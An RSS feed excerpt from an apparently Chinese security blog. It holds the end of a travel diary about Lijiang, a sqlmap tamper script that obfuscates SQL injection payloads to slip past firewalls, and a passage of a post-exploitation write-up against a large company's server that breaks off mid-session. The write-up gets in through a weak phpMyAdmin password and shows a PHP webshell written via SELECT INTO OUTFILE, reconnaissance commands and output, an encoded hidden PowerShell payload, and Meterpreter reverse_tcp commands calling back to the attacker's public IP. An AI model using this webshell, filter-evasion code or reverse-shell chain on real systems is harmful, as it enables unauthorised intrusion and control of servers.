&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x87.jpg&quot; alt=&quot;返程之前的年会&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x88.jpg&quot; alt=&quot;返程之前的年会&quot; /&gt;&lt;/p&gt;

&lt;p&gt;晚上的年会晚饭，菜很多~ 大多都是比较重口的&lt;/p&gt;

&lt;p&gt;哈哈 而且还有抽奖环节，我弄了个平板 ~&lt;/p&gt;

&lt;h2 id=&quot;返回杭州&quot;&gt;返回杭州&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x89.jpg&quot; alt=&quot;返回杭州&quot; /&gt;&lt;/p&gt;

&lt;p&gt;临走之前再拍一下客栈&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x90.jpg&quot; alt=&quot;返回杭州&quot; /&gt;&lt;/p&gt;

&lt;p&gt;坐完大巴到达丽江机场&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x91.jpg&quot; alt=&quot;返回杭州&quot; /&gt;&lt;/p&gt;

&lt;p&gt;然后发现了一些比较有意思的事情&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x92.jpg&quot; alt=&quot;返回杭州&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这个点烟器很骚~  设计师也很聪明~ 哈哈哈 平常机场里都是电热点烟，这个弄了两排打火机，废物利用了&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x93.jpg&quot; alt=&quot;返回杭州&quot; /&gt;&lt;/p&gt;

&lt;p&gt;登机回家~&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x94.jpg&quot; alt=&quot;返回杭州&quot; /&gt;&lt;/p&gt;

&lt;p&gt;出了机场，就看到了杭州是阴天，飘着毛毛细雨，空气倒是比丽江湿润一些。&lt;/p&gt;

&lt;p&gt;旅程到此就结束了，回到家还收到了漏洞银行的礼物 开心~&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x95.jpg&quot; alt=&quot;返回杭州&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x96.jpg&quot; alt=&quot;返回杭州&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x97.jpg&quot; alt=&quot;返回杭州&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;最后的感受&quot;&gt;最后的感受&lt;/h2&gt;

&lt;p&gt;这是我人生第一次旅游，东西没带够、又不太会玩，购物欲望也不强，确实比较尴尬&lt;/p&gt;

&lt;p&gt;但是有了第一次旅行，绝对会将旅游当做一个生活必需品了，就像去KTV唱歌一样，定期去世界看看~&lt;/p&gt;

&lt;p&gt;看到山山水水，登上云端，让我更加敬畏自然、热爱生活、热爱每个看到的风景，反而对于城市少了一些热情。&lt;/p&gt;

&lt;p&gt;快过年了，希望大家在明年心想事成、有所收获。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x52.jpg&quot; alt=&quot;END&quot; /&gt;&lt;/p&gt;

</description>
        <pubDate>Mon, 22 Jan 2018 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/archivers/2018-01-22/1</link>
        <guid isPermaLink="true">http://localhost:4000/archivers/2018-01-22/1</guid>
        
        
        <category>生活</category>
        
      </item>
    
      <item>
        <title>Sqlmap tamper 总结</title>
        <description>&lt;p&gt;总结一下tamper
&lt;!--more--&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x00-绕过防火墙&quot;&gt;0x00 绕过防火墙&lt;/h2&gt;

&lt;p&gt;防火墙的规则肯定是没有WAF更新的那么快，所以要写一个比较实用的、容易变通的tamper：&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/env python&lt;/span&gt;

&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;re&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;lib.core.enums&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PRIORITY&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;__priority__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PRIORITY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HIGHEST&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;dependencies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;tamper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kwargs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;CONCAT(&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;CONCAT_WS(MID(CHAR(0),0,0),&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;AND&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/* (;.../+___io1d_6^1``)*/AND&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;SLEEP&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sLEep&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ASCII(&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ASCII/*i({].,$$!~!&amp;lt;)*/(&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;VARCHAR(&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;VARCHAR/**/(&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;CHR(&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;CHR/*io&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;!`;/.,-=+/2*/(&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;(SELECT&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/*`^~`&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Ddhsjnnw_+ddsws//-  */( SELECT&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;UNION&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/*PPdd{[;!`(_.,&amp;gt;?l}*/ UNION&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%0&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;A&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ORDER&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ORDER&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%0&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;A&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;EXISTS&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;EXISTS&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%0&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;A&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;LIMIT&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;LIMIT&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%0&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;A&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#payload = payload.replace(&quot;SLEEP(5)&quot;,&quot;\&quot;0\&quot; LikE Sleep(5)&quot;)&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#payload = payload.replace(&quot; &quot;,&quot;/*FFFFFFFFFFFFFFFFFFFFFFFFF*/&quot;)&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#payload = payload.replace(&quot;--&quot;,&quot;-- x&quot;)&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#p = re.compile(r'(\d+)=')&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#payload = p.sub(r&quot;'\1'LikE &quot;, payload)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

</description>
        <pubDate>Fri, 05 Jan 2018 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/archivers/2018-01-05/1</link>
        <guid isPermaLink="true">http://localhost:4000/archivers/2018-01-05/1</guid>
        
        
        <category>工具</category>
        
      </item>
    
      <item>
        <title>针对国内一大厂的后渗透 - 持续</title>
        <description>&lt;p&gt;此文将全部脱敏，涉及某大厂商，中间会穿插一些小的知识点与细节。
&lt;!--more--&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x00-前言&quot;&gt;0x00 前言&lt;/h2&gt;

&lt;p&gt;此文将全部脱敏，涉及某大厂商，中间会穿插一些小的知识点与细节。&lt;/p&gt;

&lt;h2 id=&quot;0x01-信息搜集---后渗透&quot;&gt;0x01 信息搜集 - 后渗透&lt;/h2&gt;

&lt;p&gt;首先我们后渗透阶段的开始表现在 拥有一个Webshell或者通过其他漏洞获取了某些操作服务器文件的权限，亦或者能够直接反弹Shell&lt;/p&gt;

&lt;p&gt;这里我挑选了一个某厂边缘处的一个测试环境，在这之前我做了大量的信息搜集，没有选择直接去挖掘、利用漏洞&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;操作系统&lt;/li&gt;
  &lt;li&gt;Web服务器版本&lt;/li&gt;
  &lt;li&gt;PHP版本&lt;/li&gt;
  &lt;li&gt;绝对路径&lt;/li&gt;
  &lt;li&gt;子域名&lt;/li&gt;
  &lt;li&gt;开放端口 - 发现开启了防火墙&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;扫描到它存在&lt;code class=&quot;highlighter-rouge&quot;&gt;phpMyadmin&lt;/code&gt;，弱口令登录进入，通过常规手法SQL写入shell。&lt;/p&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;?php @assert($_POST[&quot;qyxmsq56dhaye3&quot;]);?&amp;gt;'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;INTO&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OUTFILE&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'D:/WWW/***/master/'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;通过Webshell的方式进入，肯定是要直接看权限了，但是由于是他们的测试环境，权限相对比较高。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;D:\WWW\***\master\&amp;gt; net user /domain
这项请求将在域 WORKGROUP 的域控制器处理。

发生系统错误 1355。

指定的域不存在，或无法联系。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;通过上面的结果可以看到该服务器并不是域成员&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;D:\WWW\***\master\&amp;gt; query user
* 没有用户
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;没有管理员在线&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
D:\WWW\***\master\&amp;gt; netstat -ano

活动连接

  协议  本地地址          外部地址        状态           PID
  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       1692
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       1584
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       12
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       1740
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       3740
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       828
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       1052
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       1108
  TCP    0.0.0.0:49160          0.0.0.0:0              LISTENING       932
  TCP    0.0.0.0:49161          0.0.0.0:0              LISTENING       924
  TCP    10.***.63.178:139      0.0.0.0:0              LISTENING       4
  TCP    10.***.191.178:139     0.0.0.0:0              LISTENING       4
  TCP    10.***.191.178:58359   *.*.*.*:****     ESTABLISHED     5576
  TCP    10.***.191.178:58362   *.*.*.*:****     ESTABLISHED     4700
  TCP    *.*.*.*:****     *.*.*.*:****    TIME_WAIT       0
  TCP    *.*.*.*:****     *.*.*.*:****    ESTABLISHED     1584
  TCP    169.254.112.31:139     0.0.0.0:0              LISTENING       4
  TCP    169.254.191.36:139     0.0.0.0:0              LISTENING       4
  TCP    [::]:21                [::]:0                 LISTENING       1692
  TCP    [::]:80                [::]:0                 LISTENING       1584
  TCP    [::]:135               [::]:0                 LISTENING       12
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:3389              [::]:0                 LISTENING       3740
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49152             [::]:0                 LISTENING       828
  TCP    [::]:49153             [::]:0                 LISTENING       1052
  TCP    [::]:49154             [::]:0                 LISTENING       1108
  TCP    [::]:49160             [::]:0                 LISTENING       932
  TCP    [::]:49161             [::]:0                 LISTENING       924
  UDP    0.0.0.0:500            *:*                                    1108
  UDP    0.0.0.0:4500           *:*                                    1108
  UDP    0.0.0.0:5355           *:*                                    1248
  UDP    10.***.63.178:137      *:*                                    4
  UDP    10.***.63.178:138      *:*                                    4
  UDP    10.***.191.178:137     *:*                                    4
  UDP    10.***.191.178:138     *:*                                    4
  UDP    169.254.112.31:137     *:*                                    4
  UDP    169.254.112.31:138     *:*                                    4
  UDP    169.254.191.36:137     *:*                                    4
  UDP    169.254.191.36:138     *:*                                    4
  UDP    [::]:500               *:*                                    1108
  UDP    [::]:4500              *:*                                    1108
  UDP    [::]:5355              *:*                                    1248
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可以发现有3389端口，我尝试了去直接连接，但是被拒绝了，绝对是防火墙做了入站限制&lt;/p&gt;

&lt;p&gt;这个尝试是有风险的，因为你不知道下一步的操作能够为自己带来怎样的走向&lt;/p&gt;

&lt;p&gt;再查看一下网卡：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;D:\WWW\****\master\&amp;gt; ipconfig

Windows IP 配置


以太网适配器 本地连接 4:

   连接特定的 DNS 后缀 . . . . . . . : 
   本地链接 IPv6 地址. . . . . . . . : fe80::35ec:****:321d%17
   IPv4 地址 . . . . . . . . . . . . : 10.159.191.178
   子网掩码  . . . . . . . . . . . . : 255.255.255.128
   IPv4 地址 . . . . . . . . . . . . : ****
   子网掩码  . . . . . . . . . . . . : 255.255.255.255
   默认网关. . . . . . . . . . . . . : 10.159.191.254

以太网适配器 本地连接 3:

   连接特定的 DNS 后缀 . . . . . . . : 
   本地链接 IPv6 地址. . . . . . . . : fe80::****:701f%15
   自动配置 IPv4 地址  . . . . . . . : 169.254.112.31
   子网掩码  . . . . . . . . . . . . : 255.255.0.0
   默认网关. . . . . . . . . . . . . : 

以太网适配器 本地连接 2:

   连接特定的 DNS 后缀 . . . . . . . : 
   本地链接 IPv6 地址. . . . . . . . : fe80::****:7c4d:bf24%13
   自动配置 IPv4 地址  . . . . . . . : 169.254.191.36
   子网掩码  . . . . . . . . . . . . : 255.255.0.0
   默认网关. . . . . . . . . . . . . : 

以太网适配器 本地连接:

   连接特定的 DNS 后缀 . . . . . . . : 
   本地链接 IPv6 地址. . . . . . . . : fe80::****:b5e7:5894%11
   IPv4 地址 . . . . . . . . . . . . : 10.159.63.178
   子网掩码  . . . . . . . . . . . . : 255.255.255.128
   默认网关. . . . . . . . . . . . . : 

隧道适配器 isatap.{228D34A2-****-B05B-2891059A32DF}:

   媒体状态  . . . . . . . . . . . . : 媒体已断开
   连接特定的 DNS 后缀 . . . . . . . : 

隧道适配器 isatap.{9F839E1D-****-82F7-592092A89872}:

   媒体状态  . . . . . . . . . . . . : 媒体已断开
   连接特定的 DNS 后缀 . . . . . . . : 

隧道适配器 isatap.{C900083B-5E7E-****-8BC25B24D7C1}:

   媒体状态  . . . . . . . . . . . . : 媒体已断开
   连接特定的 DNS 后缀 . . . . . . . : 

隧道适配器 isatap.{0E2DB1B0-50C3-****-4F5513DCBD08}:

   媒体状态  . . . . . . . . . . . . : 媒体已断开
   连接特定的 DNS 后缀 . . . . . . . : 

隧道适配器 6TO4 Adapter:

   连接特定的 DNS 后缀 . . . . . . . : 
   IPv6 地址 . . . . . . . . . . . . : ***
   默认网关. . . . . . . . . . . . . : 
 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这个内网地址我就不脱敏了，方便读者阅读后面的操作&lt;/p&gt;

&lt;h2 id=&quot;0x02-后渗透的开始&quot;&gt;0x02 后渗透的开始&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-12-28/2017-12-28-0x01.png&quot; alt=&quot;0x01&quot; /&gt;
网络拓扑图如上&lt;/p&gt;

&lt;p&gt;首先我要生成一个MSF木马，目标由于是Win 2008支持&lt;code class=&quot;highlighter-rouge&quot;&gt;Powershell&lt;/code&gt;，可以直接一句话搞定 :)&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./ps1encode.rb -i 外网IP -p 1131 -a windows/x64/meterpreter/reverse_tcp &lt;/code&gt;&lt;/p&gt;

&lt;p&gt;这里我是进行了一个端口转发，将公司路由的1131映射到本机的1131&lt;/p&gt;

&lt;p&gt;MSF这边监听1131：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Jobs
====

  Id  Name                    Payload                          Payload opts
  --  ----                    -------                          ------------
  0   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://0.0.0.0:1131
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;ps1encode 项目 ：https://github.com/CroweCybersecurity/ps1encode&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;powershell -nop -win Hidden -noni -enc JAAxACAAPQAgACcAJABjACAAPQAgACcAJwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAFYAaQByAHQAdQBhAGwAQQBsAGwAbwBjACgASQBuAHQAUAB0AHIAIABsAHAAQQBkAGQAcgBlAHMAcwAsACAAdQBpAG4AdAAgAGQAdwBTAGkAegBlACwAIAB1AGkAbgB0ACAAZgBsAEEAbABsAG8AYwBhAHQAaQBvAG4AVAB5AHAAZQAsACAAdQBpAG4AdAAgAGYAbABQAHIAbwB0AGUAYwB0ACkAOwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQ
..........
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;但是期望越大失望越大，目标主机提示语法错误，难道是webshell传输字符串太长有丢失？&lt;/p&gt;

&lt;p&gt;我尝试了使用cmd批处理脚本启动，vbs脚本启动，一样无果。&lt;/p&gt;

&lt;p&gt;决定不采用powershell了，采用exe&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./ps1encode.rb -i [我的公网IP] -p 1131 -a windows/x64/meterpreter/reverse_tcp -t exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;执行过程中有时候会出现这类情况：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit(handler) &amp;gt; 
[*] Sending stage (179267 bytes) to *.*.*.*
[*] Meterpreter session 1 opened (192.168.3.13:1131 -&amp;gt; *.*.*.*:54103) at 2017-12-27 13:54:58 +0800
[*] *.*.*.* - Meterpreter session 9 closed.  Reason: Died
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;很明显是生成的木马与操作系统不兼容；&lt;/p&gt;

&lt;p&gt;更改为：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./ps1encode.rb -i *.*.*.* -p 1131 -a windows/x64/meterpreter/reverse_tcp --32bitexe -t exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;使用WebShell执行后：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit(handler) &amp;gt; 
